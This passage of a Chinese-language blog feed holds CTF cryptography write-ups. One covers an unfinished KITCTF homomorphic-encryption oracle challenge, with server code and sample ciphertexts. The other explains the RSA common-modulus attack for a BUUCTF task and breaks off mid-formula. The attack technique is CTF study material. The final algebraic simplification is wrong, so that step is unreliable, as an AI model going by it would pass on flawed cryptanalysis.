class="number">100</span>):</span><br><span class="line">    number = random.randint(<span class="number">11</span>, <span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">    ct = encrypt(pk, n, q, t, poly_mod, number)</span><br><span class="line">    outputCipher(ct)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;What do you want?\n&quot;</span>).strip())</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">            number_input = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;What do you want to encrypt?\n&quot;</span>).strip(), <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> number_input &gt; <span class="number">20</span> <span class="keyword">or</span> number_input &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Thats out of bound&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                outputCipher(smart_enrypt(number_input))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">1</span>:</span><br><span class="line">            cipher_input = <span class="built_in">input</span>(<span class="string">&quot;What is the first part of the Cipher?\n&quot;</span>).strip()</span><br><span class="line">            c0 = [<span class="built_in">int</span>(n, <span class="number">10</span>) <span class="keyword">for</span> n <span class="keyword">in</span> cipher_input.split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            cipher_input = <span class="built_in">input</span>(<span class="string">&quot;What is the second part of the Cipher?\n&quot;</span>).strip()</span><br><span class="line">            c1 = [<span class="built_in">int</span>(n, <span class="number">10</span>) <span class="keyword">for</span> n <span class="keyword">in</span> cipher_input.split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            c = (c0, c1)</span><br><span class="line">            oracle(c)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    real_factors = get_factors(number)</span><br><span class="line">    primes = <span class="built_in">input</span>(<span class="string">&quot;What are the factors?\n&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(primes) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(real_factors) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            loose()</span><br><span class="line"></span><br><span class="line">    primes_set = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> primes.split(<span class="string">&quot;,&quot;</span>):</span><br><span class="line">        primes_set.add(<span class="built_in">int</span>(num, <span class="number">10</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (real_factors == primes_set):</span><br><span class="line">        loose()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You won: Flag&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="解題思路-4"><a class="markdownIt-Anchor" href="#解題思路-4"></a> 解題思路</h3><p>賽中看到檔案太長了，有點被繞暈就沒細看，星期天我就跑去找林妤瑄了，現在來補題消業障哇哇，還好系統都還開著</p><p>在重新做題的過程中，有參考 <a href="https://github.com/JoshuaTurner3/kitctfctf_2022%EF%BC%8C%E6%84%9F%E8%AC%9D%E4%BB%96%E5%9C%A8%E6%88%91%E8%BF%B7%E8%8C%AB%E7%9A%84%E6%99%82%E5%80%99%E7%B5%A6%E6%88%91%E4%BA%86%E5%BE%88%E5%A4%9A%E5%BE%88%E5%A4%9A%E7%9A%84%E6%80%9D%E8%B7%AF%E3%80%82">https://github.com/JoshuaTurner3/kitctfctf_2022，感謝他在我迷茫的時候給我了很多很多的思路。</a></p><p>實際運行起來的樣子如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">725604,61748,736872,167264,726582,230045,684241,402364,500164,378821,676833,385962,883217,283011,821625,140155,818496,211240,1004947,476860,795144,628346,262435,659908,531596,453064,997759,725680,363241,37811,19872,2529,695247,348406,34052,930284,737477,690703,307210,155771,891828,214473,421622,962674,114283,878362,209636,158230,724381,10328,63827,815739,480336,540171,486032,507201,775681,388709,359443,853874,683789,506695,644574,119382</span><br><span class="line">272313,686933,572275,728941,120913,719663,236207,699985,919947,400987,746845,590894,424709,992827,503516,859481,900467,44294,142993,899039,245844,382608,699096,429861,222196,893746,347212,250884,174694,675941,36680,576091,1027585,285770,632236,204018,975537,974106,455340,413858,730194,988460,235061,674460,357323,959157,239613,342672,798037,154907,969014,870285,717003,713114,609277,781704,320023,791527,130071,683095,223396,469920,226228,1006353</span><br><span class="line">What do you want?</span><br></pre></td></tr></table></figure><p>這裡在程式中的這個迴圈內。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;What do you want?\n&quot;</span>).strip())</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">0</span>:</span><br><span class="line">        number_input = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;What do you want to encrypt?\n&quot;</span>).strip(), <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> number_input &gt; <span class="number">20</span> <span class="keyword">or</span> number_input &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Thats out of bound&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            outputCipher(smart_enrypt(number_input))</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="number">1</span>:</span><br><span class="line">        cipher_input = <span class="built_in">input</span>(<span class="string">&quot;What is the first part of the Cipher?\n&quot;</span>).strip()</span><br><span class="line">        c0 = [<span class="built_in">int</span>(n, <span class="number">10</span>) <span class="keyword">for</span> n <span class="keyword">in</span> cipher_input.split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">        cipher_input = <span class="built_in">input</span>(<span class="string">&quot;What is the second part of the Cipher?\n&quot;</span>).strip()</span><br><span class="line">        c1 = [<span class="built_in">int</span>(n, <span class="number">10</span>) <span class="keyword">for</span> n <span class="keyword">in</span> cipher_input.split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">        c = (c0, c1)</span><br><span class="line">        oracle(c)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>他的意思大概是這樣，輸入0時，可以給server一個1-20的數字加密，數字被加密後，會再全部輸出出來，大概長下面這樣。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">What do you want?</span><br><span class="line">0</span><br><span class="line">What do you want to encrypt?</span><br><span class="line">1</span><br><span class="line">297546,894548,962397,632798,959320,389716,782894,244256,892723,534020,49760,208546,84828,801198,908730,1009738,565059,180967,268117,596152,788023,101575,509054,819493,758312,32607,414340,915833,843780,1047765,1048513,953350,727494,656769,387283,342312,542116,1011629,161946,30789,560224,881280,617889,690969,51193,802264,97521,841614,391192,736971,401794,154903,230990,485572,1031211,722401,234762,321451,1023873,1048122,773534,267151,788630,566988</span><br><span class="line">1028112,1021826,866175,678874,719734,63464,934545,147031,87452,999046,942908,54279,861074,302974,808473,33251,389249,888962,343766,334198,333827,831235,981448,600307,67075,472428,638,337256,347730,887133,462562,951685,128271,370183,512643,715276,461479,957018,440753,115606,968993,858054,305873,660926,920597,1040339,233936,958199,862394,50361,923216,1013148,954379,348796,540653,1034910,285680,695212,697321,1037273,882961,253055,1030856,899596</span><br></pre></td></tr></table></figure><p>輸入1的時候，要輸入兩串list給server，server會跑解密程式來比對兩串list解密出來的值是否為0，我丟輸入0時取得的密文，可想而知的失敗了，果然事情沒那麼簡單。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">What do you want?</span><br><span class="line">1</span><br><span class="line">What is the first part of the Cipher?</span><br><span class="line">297546,894548,962397,632798,959320,389716,782894,244256,892723,534020,49760,208546,84828,801198,908730,1009738,565059,180967,268117,596152,788023,101575,509054,819493,758312,32607,414340,915833,843780,1047765,1048513,953350,727494,656769,387283,342312,542116,1011629,161946,30789,560224,881280,617889,690969,51193,802264,97521,841614,391192,736971,401794,154903,230990,485572,1031211,722401,234762,321451,1023873,1048122,773534,267151,788630,566988</span><br><span class="line">What is the second part of the Cipher?</span><br><span class="line">297546,894548,962397,632798,959320,389716,782894,244256,892723,534020,49760,208546,84828,801198,908730,1009738,565059,180967,268117,596152,788023,101575,509054,819493,758312,32607,414340,915833,843780,1047765,1048513,953350,727494,656769,387283,342312,542116,1011629,161946,30789,560224,881280,617889,690969,51193,802264,97521,841614,391192,736971,401794,154903,230990,485572,1031211,722401,234762,321451,1023873,1048122,773534,267151,788630,566988</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>輸入2時，會跳出迴圈，進入以下程式碼。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">real_factors = get_factors(number)</span><br><span class="line">primes = <span class="built_in">input</span>(<span class="string">&quot;What are the factors?\n&quot;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(primes) == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(real_factors) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        loose()</span><br><span class="line"></span><br><span class="line">primes_set = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> primes.split(<span class="string">&quot;,&quot;</span>):</span><br><span class="line">    primes_set.add(<span class="built_in">int</span>(num, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (real_factors == primes_set):</span><br><span class="line">    loose()</span><br></pre></td></tr></table></figure><p>大概就是要連續猜對隨機生成數字的質數100次，在過程中可以一直重複跑0跟1來蒐集資訊。</p><p>接下來來看解密函數。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">polyadd</span>(<span class="params">x, y, modulus, poly_mod</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(</span><br><span class="line">        np.<span class="built_in">round</span>(poly.polydiv(poly.polyadd(x, y) % modulus, poly_mod)[<span class="number">1</span>] % modulus)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">sk, size, q, t, poly_mod, ct</span>):</span><br><span class="line">    scaled_pt = polyadd(</span><br><span class="line">            polymul(ct[<span class="number">1</span>], sk, q, poly_mod),</span><br><span class="line">            ct[<span class="number">0</span>], q, poly_mod</span><br><span class="line">        )</span><br><span class="line">    decrypted_poly = np.<span class="built_in">round</span>(scaled_pt * t / q) % t</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(decrypted_poly[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>整個程式太過複雜了，但幸運的是解密函數真正用到的東西並不多，並且只有解密的部分，不需要猜測種子等等東西，不過還是有一些全域變數影響解密。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># polynomial modulus degree</span></span><br><span class="line">n = <span class="number">2</span>**<span class="number">6</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># ciphertext modulus</span></span><br><span class="line">q = <span class="number">2</span>**<span class="number">20</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># plaintext modulus</span></span><br><span class="line">t = <span class="number">2</span>**<span class="number">10</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># polynomial modulus</span></span><br><span class="line">poly_mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (n - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line">pk, sk = keygen(n, q, poly_mod)</span><br></pre></td></tr></table></figure><p>然後就幹，輸光，去床上躺一下再說。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">size, modulus, poly_mod</span>):</span><br><span class="line">    sk = gen_binary_poly(size)</span><br><span class="line">    a = gen_uniform_poly(size, modulus)</span><br><span class="line">    e = gen_normal_poly(size)</span><br><span class="line">    b = polyadd(polymul(-a, sk, modulus, poly_mod), -e, modulus, poly_mod)</span><br><span class="line">    <span class="keyword">return</span> (b, a), sk</span><br></pre></td></tr></table></figure><p>接下來開始算初始值。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">poly_mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (arrSize - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>q, t, sk 我是從<a href="https://github.com/JoshuaTurner3/kitctfctf_2022">這裡</a>找到求解函數的。</p><p>接下來就可以在本地端從一開始給出的密碼開始算，然後我發現我Kubeflow還沒弄，先這樣哇哇。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 4</title>
      <link href="/ctf-crypto-buuctf-4/"/>
      <url>/ctf-crypto-buuctf-4/</url>
      
        <content type="html"><![CDATA[<h3 id="samemod"><a class="markdownIt-Anchor" href="#samemod"></a> SameMod</h3><p>題目如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;</span><br><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;</span><br><span class="line"></span><br><span class="line">message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br></pre></td></tr></table></figure><p>可從中看出n固定，屬於共模攻擊。</p><p>當n不變的情況下，知道n, e1, e2, c1, c2可以在不知道d1,d2的情況下，解出m。</p><p>首先假設，e1, e2互質，此時則有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mn>1</mn><mo>∗</mo><mi>s</mi><mn>1</mn><mo>+</mo><mi>e</mi><mn>2</mn><mo>∗</mo><mi>s</mi><mn>2</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e1*s1+e2*s2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">s</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。式子中，s1, s2皆為整數，但是一正一負。</p><p>通過擴展歐幾里德算法，我們可以得到該式子的一組解(s1,s2)，假設s1為正數,s2為負數.</p><p>因為<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">c1=m^{e1} mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">c2=m^{e2} mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><msup><mn>1</mn><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">(c1^{s1}*c2^{s2}) mod n = ((m^{e1} mod n)^{s1}*(m^{e2} mod n)^{s2}) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>。</p><p>根據模運算性質，可以化簡為<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><msup><mn>1</mn><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>s</mi><mn>2</mn></mrow></msup></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">(c1^{s1}*c2^{s2}) mod n = ((m^{e1} mod n)^{s1}*(m^{e2} mod n)^{s2}) mod n = (m^{c1^{s1}*c2^{s2}}) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.23692em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869199999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">c</span><span class="mord mtight"><span class="mord mtight">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord 